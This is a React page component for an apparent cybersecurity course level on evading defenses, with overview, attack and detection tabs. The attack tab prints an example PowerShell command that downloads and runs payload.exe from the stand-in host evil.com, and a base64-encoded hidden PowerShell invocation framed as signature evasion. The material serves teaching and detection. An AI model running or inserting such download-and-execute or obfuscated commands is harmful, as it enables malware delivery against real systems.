import { Navigation } from "@/components/Navigation";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { useState } from "react";
import { Link } from "react-router-dom";
import { Home, ChevronLeft, ChevronRight } from "lucide-react";

const Level7 = () => {
  const [activeTab, setActiveTab] = useState("overview");

  return (
    <div className="min-h-screen bg-background">
      <Navigation />
      <main className="pt-24 px-4">
        <div className="container mx-auto max-w-4xl">
          <div className="text-center mb-8">
            <h1 className="text-4xl font-bold mb-4 cyber-gradient">Level 7: Bypassing Defenses</h1>
            <p className="text-xl text-muted-foreground">Learn advanced techniques attackers use to evade modern security controls.</p>
          </div>
          <div className="sticky top-20 z-40 glass border border-border/50 rounded-lg p-1 mb-8">
            <div className="flex space-x-1">
              {[{ id: "overview", label: "1. Overview: The Cat & Mouse Game" }, { id: "offensive", label: "2. Offensive Ops" }, { id: "defensive", label: "3. Defensive Ops" }].map((tab) => (
                <button key={tab.id} onClick={() => setActiveTab(tab.id)} className={`flex-1 px-4 py-2 rounded-md font-medium transition-all ${activeTab === tab.id ? 'bg-primary text-primary-foreground' : 'text-muted-foreground hover:text-foreground'}`}>{tab.label}</button>
              ))}
            </div>
          </div>
          {activeTab === "overview" && (
            <div className="space-y-8">
              <Card className="glass">
                <CardHeader>
                  <CardTitle>The Cat & Mouse Game</CardTitle>
                </CardHeader>
                <CardContent>
                  <p className="text-muted-foreground mb-6">
                    For every defensive tool, attackers develop a way to bypass it. This is the constant "cat and mouse" game of cybersecurity.
                  </p>
                  <div className="grid md:grid-cols-3 gap-4">
                    <div className="p-4 border border-border/50 rounded-lg">
                      <div className="text-center space-y-2">
                        <div className="text-sm text-muted-foreground">Defense</div>
                        <div className="font-medium">Antivirus</div>
                        <div className="text-sm text-red-400">↓ Bypassed by ↓</div>
                        <div className="font-medium text-red-400">Obfuscation/Packing</div>
                      </div>
                    </div>
                    <div className="p-4 border border-border/50 rounded-lg">
                      <div className="text-center space-y-2">
                        <div className="text-sm text-muted-foreground">Defense</div>
                        <div className="font-medium">Firewall</div>
                        <div className="text-sm text-red-400">↓ Bypassed by ↓</div>
                        <div className="font-medium text-red-400">DNS Tunneling</div>
                      </div>
                    </div>
                    <div className="p-4 border border-border/50 rounded-lg">
                      <div className="text-center space-y-2">
                        <div className="text-sm text-muted-foreground">Defense</div>
                        <div className="font-medium">App Whitelisting</div>
                        <div className="text-sm text-red-400">↓ Bypassed by ↓</div>
                        <div className="font-medium text-red-400">LOLBins/Memory Injection</div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "offensive" && (
            <div className="space-y-8">
              <Card className="glass border-red-500/20">
                <CardHeader>
                  <CardTitle className="text-red-400">Cloak and Dagger</CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-4">Obfuscating a Payload</h3>
                    <div className="space-y-4">
                      <div className="p-4 bg-card/50 border border-border/50 rounded-lg">
                        <div className="text-sm text-green-400 font-mono">
                          # Original PowerShell Script<br/>
                          Invoke-WebRequest -Uri "http://evil.com/payload.exe" -OutFile "C:\temp\payload.exe"<br/>
                          Start-Process "C:\temp\payload.exe"
                        </div>
                      </div>
                      <Button 
                        onClick={() => {
                          const element = document.getElementById('obfuscated-payload');
                          if (element) {
                            element.style.display = element.style.display === 'none' ? 'block' : 'none';
                          }
                        }}
                        variant="destructive"
                      >
                        Obfuscate Script
                      </Button>
                      <div id="obfuscated-payload" style={{display: 'none'}} className="p-4 bg-card/50 border border-red-500/50 rounded-lg">
                        <div className="text-sm text-red-400 font-mono break-all">
                          powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAZQB
                        </div>
                        <p className="text-sm text-muted-foreground mt-2">Base64-encoded and obfuscated to evade signature detection</p>
                      </div>
                    </div>
                  </div>
                  
                  <div>
                    <h3 className="text-lg font-semibold mb-4">Domain Fronting</h3>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="p-4 border border-red-500/50 rounded-lg">
                        <div className="text-center space-y-2">
                          <div className="text-red-400 font-medium">Blocked</div>
                          <div className="text-sm">Firewall → evil-c2.com ❌</div>
                        </div>
                      </div>
                      <div className="p-4 border border-green-500/50 rounded-lg">
                        <div className="text-center space-y-2">
                          <div className="text-green-400 font-medium">Allowed</div>
                          <div className="text-sm">Firewall → google.com ✅<br/>(hiding evil traffic)</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}

          {activeTab === "defensive" && (
            <div className="space-y-8">
              <Card className="glass border-blue-500/20">
                <CardHeader>
                  <CardTitle className="text-blue-400">Advanced Threat Detection</CardTitle>
                </CardHeader>
                <CardContent className="space-y-6">
                  <div>
                    <h3 className="text-lg font-semibold mb-4">Detecting PowerShell Obfuscation</h3>
                    <div className="p-4 bg-card/50 border border-border/50 rounded-lg font-mono text-sm space-y-2">
                      <div className="text-green-400 cursor-pointer">Get-Process</div>
                      <div className="text-green-400 cursor-pointer">Get-Service</div>
                      <div 
                        className="text-yellow-400 cursor-pointer hover:bg-red-500/20 p-1 rounded"
                        onClick={(e) => {
                          (e.target as HTMLElement).classList.add('bg-red-500/50');
                          const msg = document.getElementById('obfuscation-msg');
                          if (msg) msg.style.display = 'block';
                        }}
                      >
                        powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGU...
                      </div>
                      <div className="text-green-400 cursor-pointer">Get-EventLog</div>
                    </div>
                    <div id="obfuscation-msg" style={{display: 'none'}} className="mt-2 p-2 bg-blue-500/20 border border-blue-500/50 rounded text-sm">
                      ✅ Correct! Look for indicators: -enc, -nop, -w hidden, and unusually long command lines.
                    </div>
                  </div>

                  <div>
                    <h3 className="text-lg font-semibold mb-4">TLS/SSL Inspection</h3>
                    <div className="grid md:grid-cols-2 gap-4">
                      <div className="p-4 border border-border/50 rounded-lg cursor-pointer">
                        <div className="text-center space-y-2">
                          <div className="text-red-400">❌ Standard Firewall</div>
                          <div className="text-sm">Encrypted traffic passes through</div>
                        </div>
                      </div>
                      <div 
                        className="p-4 border border-green-500/50 rounded-lg cursor-pointer hover:bg-green-500/20"
                        onClick={(e) => {
                          const msg = document.getElementById('tls-msg');
                          if (msg) msg.style.display = 'block';
                        }}
                      >
                        <div className="text-center space-y-2">
                          <div className="text-green-400">✅ TLS Inspection Proxy</div>
                          <div className="text-sm">Decrypt → Analyze → Re-encrypt</div>
                        </div>
                      </div>
                    </div>
                    <div id="tls-msg" style={{display: 'none'}} className="mt-2 p-2 bg-blue-500/20 border border-blue-500/50 rounded text-sm">
                      ✅ Correct! TLS inspection allows deep packet analysis of encrypted traffic.
                    </div>
                  </div>
                </CardContent>
              </Card>
            </div>
          )}
          <div className="flex justify-between items-center py-8">
            <Button asChild variant="cyber-ghost" size="lg"><Link to="/level/6" className="flex items-center gap-2"><ChevronLeft className="w-4 h-4" />Previous</Link></Button>
            <Button asChild variant="cyber-ghost" size="lg"><Link to="/" className="flex items-center gap-2"><Home className="w-4 h-4" />Home</Link></Button>
            <Button asChild variant="cyber" size="lg"><Link to="/level/8" className="flex items-center gap-2">Next<ChevronRight className="w-4 h-4" /></Link></Button>
          </div>
        </div>
      </main>
    </div>
  );
};

export default Level7;